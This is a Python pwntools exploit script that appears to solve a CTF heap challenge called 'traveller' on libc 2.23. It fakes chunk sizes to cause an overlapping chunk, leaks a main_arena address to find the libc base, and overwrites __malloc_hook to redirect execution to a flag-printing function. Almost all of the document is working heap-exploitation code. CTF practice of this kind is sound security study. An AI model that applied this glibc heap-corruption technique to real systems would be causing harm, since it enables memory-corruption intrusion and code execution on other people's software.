import pwn as p


target = p.process('./traveller', env={'LD_PRELOAD': './libc-2.23.so'})
# p.gdb.attach(target)

libc = p.ELF('libc-2.23.so')


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b), end='')


OPTION_0X80 = 1
OPTION_0X110 = 2
OPTION_0X128 = 3
OPTION_0X150 = 4
OPTION_0X200 = 5


def create(option, destination: bytes) -> None:
    if option not in [OPTION_0X80, OPTION_0X110, OPTION_0X128, OPTION_0X150, OPTION_0X200]:
        print(f'wrong option to create chunk: {option}')
        return
    target.sendline(b'1')
    target.sendline(b(str(option)))
    target.sendline(destination)


def change(index, payload: bytes) -> None:
    target.sendline(b'2')
    target.sendline(b(str(index)))
    target.sendline(payload)


def delete(index) -> None:
    target.sendline(b'3')
    target.sendline(b(str(index)))


def check(index) -> None:
    target.sendline(b'4')
    target.sendline(b(str(index)))
    prints(target.recvuntil(b'Which trip you want to view? \n'))
    line = target.recvline().strip().replace(b'>', b'')
    leak = p.u64(line + b'\x00'*(8-len(line)))
    return leak


# sync IOs
input()

prints(target.recvuntil(b'Hello! Welcome to trip management system. \n'))
stack_leak = int(target.recvline().strip(), 16)
print('stack_leak:', hex(stack_leak))

for i in range(4):
    create(OPTION_0X80, b'-'*0x80)

for i in range(4):
    delete(3-i)

create(OPTION_0X150, b'j' * 0x150)
create(OPTION_0X128, b'a' * 0x128)
create(OPTION_0X150, b'b' * 0x150)

# consolidate chunk, containing a forgotten chunk
delete(0)
change(1, b'a'*0x120 + p.p64(0x290))
change(0, b'b'*0xf0 + p.p64(0x100)+p.p64(0x61))
delete(0)

# allocate up to the forgotten chunk (LOTs of tries)
create(OPTION_0X150, b'j' * 0x20)
create(OPTION_0X80, b'j' * 0x20)
create(OPTION_0X80, b'j' * 0x20)

# leak the main_arena addresses from the forgotten chunk
leak = check(0)
print('leak:', hex(leak))
libc_base = leak - 0x3c4b78
print('libc_base:', hex(libc_base))

# edit a pointer of a trip entry, so we will be able to write to hook
create(OPTION_0X80, b'c'*0x20)
malloc_hook = libc_base + libc.symbols['__malloc_hook']
print('malloc_hook:', hex(malloc_hook))
change(0, p.p64(malloc_hook))

# write on malloc hook
cat_flag = 0x004008b6
change(4, p.p64(cat_flag))

create(OPTION_0X80, b'done !')

target.interactive()
